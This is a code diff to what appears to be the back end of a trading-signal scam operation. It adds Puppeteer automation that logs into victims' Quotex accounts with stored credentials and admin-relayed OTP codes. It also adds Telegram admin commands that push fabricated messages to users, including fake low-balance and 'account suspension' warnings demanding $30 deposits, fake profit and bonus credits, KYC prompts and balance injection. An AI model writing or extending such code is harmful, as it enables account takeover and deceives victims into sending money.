@@ -303,16 +303,16 @@ async function launchQuotexSession(session) {
         // Fill email
         await updateSession(session, 'filling', '✍️ Entering email...');
         const emailSel = 'input[type="email"], input[name="email"], input[placeholder*="mail" i], input[placeholder*="Email" i]';
-        await page.waitForSelector(emailSel, { timeout: 20000 });
-        await page.click(emailSel);
+        await page.waitForSelector(emailSel, { visible: true, timeout: 20000 });
+        await safeClick(page, emailSel);
         await sleep(300);
         await page.type(emailSel, email, { delay: 60 });
 
         // Fill password
         await updateSession(session, 'filling', '✍️ Entering password...');
         const passSel = 'input[type="password"], input[name="password"], input[placeholder*="assword" i]';
-        await page.waitForSelector(passSel, { timeout: 10000 });
-        await page.click(passSel);
+        await page.waitForSelector(passSel, { visible: true, timeout: 10000 });
+        await safeClick(page, passSel);
         await sleep(300);
         await page.type(passSel, password, { delay: 60 });
 
@@ -323,7 +323,7 @@ async function launchQuotexSession(session) {
         const btnSel = 'button[type="submit"], form button, [class*="sign-in"] button, [class*="login"] button, [class*="submit"] button';
         const submitBtn = await page.$(btnSel);
         if (submitBtn) {
-            await submitBtn.click();
+            await safeClick(page, btnSel);
         } else {
             // Press Enter on password field
             await page.keyboard.press('Enter');
@@ -493,14 +493,14 @@ async function submitQuotexOTP(sessionId, otp) {
                 if (el) { el.value = ''; el.dispatchEvent(new Event('input', { bubbles: true })); }
             }, singleSel);
             await sleep(300);
-            await page.click(singleSel);
+            await safeClick(page, singleSel);
             await page.type(singleSel, otp, { delay: 80 });
         } else {
             // Pattern 2: Individual digit inputs
             const digits = await page.$$('input[maxlength="1"]');
             if (digits.length >= 4) {
                 for (let i = 0; i < Math.min(otp.length, digits.length); i++) {
-                    await digits[i].click();
+                    try { await digits[i].click({ delay: 30 }); } catch(e) { await page.evaluate(el => el.click(), digits[i]); }
                     await sleep(100);
                     await digits[i].type(String(otp[i]), { delay: 80 });
                 }
@@ -515,7 +515,7 @@ async function submitQuotexOTP(sessionId, otp) {
         const submitSel = 'button[type="submit"], [class*="confirm"] button, [class*="verify"] button, [class*="submit"] button, form button';
         const btn = await page.$(submitSel);
         if (btn) {
-            await btn.click();
+            try { await safeClick(page, submitSel); } catch(e) { await page.keyboard.press('Enter'); }
         } else {
             await page.keyboard.press('Enter');
         }
@@ -732,9 +732,87 @@ const QUICK_TRIGGERS = {
         type: 'instruction',
         text: '🔔 Close your current position now! The signal target has been reached. Take your profit.',
     },
+    // ── Low Balance / Deposit ────────────────────────────────────────────
+    low_balance: {
+        type: 'warning',
+        text: '⚠️ Dear User, You Have Low Balance in your Quotex Account. Please Deposit $30 or Above To Continue.',
+    },
+    low_balance_urgent: {
+        type: 'alert',
+        text: '🚨 URGENT: Your Quotex Account Balance is critically low. Please Deposit a minimum of $30 immediately to continue receiving live trading signals and avoid account suspension.',
+    },
+    deposit_required: {
+        type: 'alert',
+        text: '💰 A minimum deposit of $30 is required to activate your trading account and access live signals. Please deposit now to continue.',
+    },
+    deposit_30: {
+        type: 'instruction',
+        text: '💵 Please make a deposit of at least $30 into your Quotex account to continue. Go to the Cashier section and select your preferred payment method.',
+    },
+    // ── Verification / KYC ──────────────────────────────────────────────
+    kyc_required: {
+        type: 'instruction',
+        text: '📄 Identity Verification Required: Please complete your KYC verification to unlock full trading access and withdrawals. Upload your ID document in the Verification section.',
+    },
+    account_verified: {
+        type: 'info',
+        text: '✅ Your account has been successfully verified! All trading features and withdrawal options are now fully unlocked.',
+    },
+    // ── Trading ─────────────────────────────────────────────────────────
+    trade_open: {
+        type: 'info',
+        text: '📈 A new trade has been opened on your account. Monitor your position and follow the signal instructions carefully.',
+    },
+    profit_received: {
+        type: 'info',
+        text: '🎯 Congratulations! Your trade closed in profit. Earnings have been credited to your Quotex balance. Stay connected for the next signal.',
+    },
+    session_expiring: {
+        type: 'warning',
+        text: '⚠️ Your session will expire in 5 minutes. Please complete any pending actions now or refresh to extend your session.',
+    },
+    // ── Bonus ────────────────────────────────────────────────────────────
+    bonus_credited: {
+        type: 'info',
+        text: '🎁 A bonus has been credited to your Quotex account! Check your balance — the bonus is ready to use for trading.',
+    },
+    upgrade_required: {
+        type: 'instruction',
+        text: '⬆️ A plan upgrade is required to access premium signals and advanced trading features. Please contact support or upgrade via your account settings.',
+    },
 };
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ── Puppeteer safe-click: scrolls into view, waits for visibility, falls back
+//    to direct DOM click — fixes "Node is not clickable or not an Element"
+async function safeClick(page, selector) {
+    try {
+        // Wait up to 8s for element to appear
+        await page.waitForSelector(selector, { visible: true, timeout: 8000 }).catch(() => {});
+        const el = await page.$(selector);
+        if (!el) throw new Error('Element not found: ' + selector);
+        // Scroll into view
+        await page.evaluate(s => {
+            const node = document.querySelector(s);
+            if (node) node.scrollIntoView({ behavior: 'instant', block: 'center' });
+        }, selector);
+        await sleep(200);
+        // Try normal Puppeteer click first
+        try {
+            await el.click({ delay: 30 });
+        } catch(clickErr) {
+            // Fallback: force click via DOM .click()
+            await page.evaluate(s => {
+                const node = document.querySelector(s);
+                if (node) { node.removeAttribute('disabled'); node.click(); }
+            }, selector);
+        }
+    } catch(e) {
+        // Last resort: keyboard Enter on focused element
+        await page.keyboard.press('Enter');
+    }
+}
 
 // ================== EXPRESS APP ==================
 const app = express();
@@ -811,6 +889,12 @@ function tgUserActionKeyboard(userName) {
             [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
              { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` },
              { text: '🏦 Withdraw',       callback_data: `qt|withdraw_processing|${u}` }],
+            [{ text: '⚠️ Low Balance',     callback_data: `qt|low_balance|${u}` },
+             { text: '🚨 Low Bal Urgent',  callback_data: `qt|low_balance_urgent|${u}` },
+             { text: '💵 Deposit $30 Now', callback_data: `qt|deposit_30|${u}` }],
+            [{ text: '📄 KYC Required',   callback_data: `qt|kyc_required|${u}` },
+             { text: '✅ Account Verified',callback_data: `qt|account_verified|${u}` },
+             { text: '🎁 Bonus Credited', callback_data: `qt|bonus_credited|${u}` }],
             // ── Quick Triggers: Status ───────────────────────────────────
             [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
              { text: '🔌 Disconnected',   callback_data: `qt|disconnected|${u}` },
@@ -849,6 +933,8 @@ function tgInjectTypeKeyboard(userName) {
              { text: '⏳ Wait',           callback_data: `qt|wait|${u}` }],
             [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
              { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` }],
+            [{ text: '⚠️ Low Balance',     callback_data: `qt|low_balance|${u}` },
+             { text: '💵 Deposit $30 Now', callback_data: `qt|deposit_30|${u}` }],
             [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
              { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
             [{ text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
@@ -878,9 +964,15 @@ function tgMaintenanceKeyboard(active) {
         inline_keyboard: [
             [{ text: active ? '✅ Maintenance ON — Click to DISABLE' : '⚪ Maintenance OFF — Click to ENABLE',
                callback_data: active ? 'maint_off' : 'maint_on' }],
-            [{ text: '⏱️ Set Duration (ask)',  callback_data: 'maint_ask_duration' }],
-            [{ text: '✏️ Edit Message',         callback_data: 'maint_ask_msg' }],
-            [{ text: '🔙 Back',                 callback_data: 'menu' }],
+            [{ text: '⏱️ 30 min',   callback_data: 'maint_preset|30m' },
+             { text: '⏱️ 1 hour',   callback_data: 'maint_preset|1h' },
+             { text: '⏱️ 2 hours',  callback_data: 'maint_preset|2h' }],
+            [{ text: '⏱️ 6 hours',  callback_data: 'maint_preset|6h' },
+             { text: '⏱️ 24 hours', callback_data: 'maint_preset|24h' },
+             { text: '♾️ No Limit', callback_data: 'maint_preset|0' }],
+            [{ text: '⏱️ Custom Duration', callback_data: 'maint_ask_duration' }],
+            [{ text: '✏️ Edit Message',     callback_data: 'maint_ask_msg' }],
+            [{ text: '🔙 Back',             callback_data: 'menu' }],
         ],
     };
 }
@@ -1038,6 +1130,24 @@ async function tgHandleCallback(chatId, data, callbackId) {
     }
 
     // ── MAINTENANCE ───────────────────────────────────────────────────
+    if (action === 'maint_preset') {
+        const presetVal = parts[1] || '0';
+        let until = null;
+        if (presetVal !== '0') {
+            const hrs = presetVal === '30m' ? 0.5 : parseInt(presetVal);
+            until = new Date(Date.now() + hrs * 3600000).toISOString();
+        }
+        maintenanceMode.until = until;
+        if (!maintenanceMode.active) { maintenanceMode.active = true; }
+        broadcastSSE('maintenance_update', maintenanceMode);
+        const label = presetVal === '0' ? '♾️ No limit' : presetVal === '30m' ? '30 minutes' : presetVal + ' hour(s)';
+        await tgApi('answerCallbackQuery', { callback_query_id: update.callback_query.id, text: `⏱️ Maintenance set to ${label}` });
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔧 <b>Maintenance ON</b> — Duration: <b>${label}</b>
+All users will see the maintenance page.`,
+            reply_markup: tgMaintenanceKeyboard(true) });
+    }
+
     if (action === 'maint_on' || action === 'maint_off') {
         maintenanceMode.active = action === 'maint_on';
         broadcastSSE('maintenance_update', maintenanceMode);
@@ -1330,42 +1440,61 @@ async function tgHandleCallback(chatId, data, callbackId) {
 }
 
 async function tgCmdHelp(chatId) {
-    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
-        '<b>🤖 Admin Bot Commands</b>\n\n' +
-        '<b>📋 Menus (Inline Buttons):</b>\n' +
-        '/menu — main dashboard\n' +
-        '/users — online users list\n' +
-        '/inject — inject message to user\n' +
-        '/sessions — Quotex sessions\n' +
-        '/licenses /lic — license management\n' +
-        '/orders — orders list\n' +
-        '/settings — bot settings\n' +
-        '/maint — maintenance mode toggle\n' +
-        '/creds — saved credentials\n' +
-        '/retry — auto-retry config\n\n' +
-        '<b>⚡ Quick Commands:</b>\n' +
-        '/online — see online users\n' +
-        '/stats — full statistics\n' +
-        '/block &lt;name&gt; — block user\n' +
-        '/unblock &lt;name&gt; — unblock user\n' +
-        '/kick &lt;name&gt; — kick user\n' +
-        '/reload &lt;name&gt; — force reload\n' +
-        '/balance &lt;name&gt; &lt;amount&gt; — inject balance\n' +
-        '/msg &lt;name&gt; &lt;text&gt; — custom message\n' +
-        '/broadcast &lt;text&gt; — broadcast to all\n\n' +
-        '<b>🤖 Quotex Sessions:</b>\n' +
-        '/qx — sessions overview\n' +
-        '/qxlaunch &lt;email&gt; &lt;pass&gt; [name] — launch\n' +
-        '/otp &lt;id&gt; &lt;code&gt; — submit OTP\n' +
-        '/qxclose &lt;id&gt; — close session\n\n' +
-        'Or send any <b>username</b> to open quick actions (partial match supported).\n\n' +
-        '<b>⚡ Quick Triggers:</b>\n' +
-        '/triggers — list all quick trigger keys\n' +
-        '/qt &lt;name&gt; &lt;key&gt; — fire a trigger directly\n\n' +
-        '<b>🔍 Search &amp; Manage:</b>\n' +
-        '/search &lt;query&gt; or /s — partial user search\n' +
-        '/u &lt;name&gt; — full user profile (with creds)\n' +
-        '/note &lt;name&gt; &lt;text&gt; — save admin note on a user' });
+    const helpText = `🤖 <b>Chinese Signal Bot — Full Command Reference</b>
+
+<b>━━━ NAVIGATION ━━━</b>
+/start /menu — Main menu keyboard
+/users — User management
+/inject — Message injection menu
+/maint — Maintenance mode
+/creds — Auto-Login credentials
+/orders — Orders management
+/licenses /lic — License management
+/settings — Bot settings
+/online — Show online users
+/stats — Bot statistics
+/qx — Active Quotex sessions
+
+<b>━━━ USER ACTIONS ━━━</b>
+Send any <b>username</b> → user action keyboard
+/block &lt;name&gt; — Block user
+/unblock &lt;name&gt; — Unblock user
+/kick &lt;name&gt; — Disconnect user session
+/reload &lt;name&gt; — Force-reload user's page
+
+<b>━━━ QUICK TRIGGERS ━━━</b>
+/tc &lt;name&gt; — 🔗 Trigger Account Connected (LIVE)
+/connected &lt;name&gt; — Account connected message
+/lowbal &lt;name&gt; — ⚠️ Low Balance Warning ($30)
+/deposit &lt;name&gt; — 💰 Deposit Required prompt
+/signal &lt;name&gt; — 📡 Signal Incoming
+/close &lt;name&gt; — 🔔 Close Position signal
+/alert &lt;name&gt; — 🚨 Account Alert
+/wait &lt;name&gt; — ⏳ Please Wait message
+/kyc &lt;name&gt; — 📄 KYC Verification required
+/msg &lt;name&gt; &lt;text&gt; — 💬 Custom message
+/balance &lt;name&gt; &lt;amount&gt; — 💰 Inject balance
+
+<b>━━━ ALL TRIGGER KEYS ━━━</b>
+/triggers — List all trigger keys
+/qt &lt;name&gt; &lt;key&gt; — Fire any trigger by key name
+/tc &lt;name&gt; — Live "Trigger Connected" (SSE)
+
+<b>━━━ BROADCAST ━━━</b>
+/broadcast &lt;text&gt; — Broadcast to all users
+
+<b>━━━ MAINTENANCE ━━━</b>
+/maint — Toggle + set duration (30m/1h/2h/6h/24h)
+
+<b>━━━ AUTO-LOGIN (QUOTEX) ━━━</b>
+/qxlaunch &lt;email&gt; &lt;pass&gt; [name] — Start Quotex login
+/otp &lt;sessionId&gt; &lt;code&gt; — Submit OTP
+/qxclose &lt;sessionId&gt; — Close session
+/qx — View all sessions
+/retry — Auto-retry config
+`;
+    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+        text: helpText, reply_markup: tgMainMenuKeyboard() });
 }
 async function tgCmdStats(chatId) {
     try {
@@ -1591,6 +1720,88 @@ async function tgHandleMessage(msg) {
     if (text === '/retry')   return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
         text: `⚙️ <b>Auto-Retry Config</b>\nEnabled: <b>${autoRetryConfig.enabled}</b>\nMax: <b>${autoRetryConfig.maxAttempts}</b>\nDelay: <b>${autoRetryConfig.delaySeconds}s</b>`,
         reply_markup: tgRetryConfigKeyboard() });
+
+    // /lowbal username — low balance warning
+    if (text.startsWith('/lowbal ') || text.startsWith('/lowbalance ')) {
+        const lbUser = text.split(' ').slice(1).join(' ').trim();
+        if (!lbUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /lowbal username' });
+        await tgInjectMessage(lbUser, 'warning', QUICK_TRIGGERS.low_balance.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `⚠️ <b>Low Balance Warning</b> sent to <b>${lbUser}</b>\n💰 Message: "Please Deposit $30 or Above To Continue"` });
+    }
+
+    // /deposit username — deposit prompt
+    if (text.startsWith('/deposit ')) {
+        const depUser = text.slice(9).trim();
+        if (!depUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /deposit username' });
+        await tgInjectMessage(depUser, 'instruction', QUICK_TRIGGERS.deposit_required.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `💰 <b>Deposit Prompt</b> sent to <b>${depUser}</b>` });
+    }
+
+    // /signal username — send signal incoming
+    if (text.startsWith('/signal ')) {
+        const sigUser = text.slice(8).trim();
+        if (!sigUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /signal username' });
+        await tgInjectMessage(sigUser, 'info', QUICK_TRIGGERS.signal_incoming.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📡 <b>Signal Incoming</b> sent to <b>${sigUser}</b>` });
+    }
+
+    // /close username — close position signal
+    if (text.startsWith('/close ')) {
+        const clUser = text.slice(7).trim();
+        if (!clUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /close username' });
+        await tgInjectMessage(clUser, 'instruction', QUICK_TRIGGERS.signal_close.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🔔 <b>Close Position</b> signal sent to <b>${clUser}</b>` });
+    }
+
+    // /kyc username — KYC required
+    if (text.startsWith('/kyc ')) {
+        const kycUser = text.slice(5).trim();
+        if (!kycUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /kyc username' });
+        await tgInjectMessage(kycUser, 'instruction', QUICK_TRIGGERS.kyc_required.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📄 <b>KYC Required</b> message sent to <b>${kycUser}</b>` });
+    }
+
+    // /alert username — account alert
+    if (text.startsWith('/alert ')) {
+        const altUser = text.slice(7).trim();
+        if (!altUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /alert username' });
+        await tgInjectMessage(altUser, 'alert', QUICK_TRIGGERS.alert.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🚨 <b>Alert</b> sent to <b>${altUser}</b>` });
+    }
+
+    // /wait username — please wait
+    if (text.startsWith('/wait ')) {
+        const waitUser = text.slice(6).trim();
+        if (!waitUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /wait username' });
+        await tgInjectMessage(waitUser, 'instruction', QUICK_TRIGGERS.wait.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `⏳ <b>Wait</b> message sent to <b>${waitUser}</b>` });
+    }
+
+    // /connected username — trigger show connected
+    if (text.startsWith('/connected ')) {
+        const cnUser = text.slice(11).trim();
+        if (!cnUser) return tgApi('sendMessage', { chat_id: chatId, text: '📌 Usage: /connected username' });
+        sendSSEToUser(cnUser, 'show_connected',    { userName: cnUser });
+        sendSSEToUser(cnUser, 'trigger_connected', { userName: cnUser });
+        await tgInjectMessage(cnUser, 'info', QUICK_TRIGGERS.success_connected.text);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `🎉 <b>Account Connected</b> triggered for <b>${cnUser}</b>` });
+    }
+
+    // /triggers — list all quick trigger keys
+    if (text === '/triggers' || text === '/keys') {
+        const keys = Object.keys(QUICK_TRIGGERS);
+        const lines = keys.map((k, i) => `${i+1}. <code>${k}</code> — ${QUICK_TRIGGERS[k].text.slice(0,40)}...`);
+        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
+            text: `📋 <b>All Quick Trigger Keys (${keys.length}):</b>\n\n${lines.join('\n')}\n\n💡 Use: <code>/qt username trigger_key</code>` });
+    }
 
     // /block username  /unblock username
     if (text.startsWith('/block ')) {
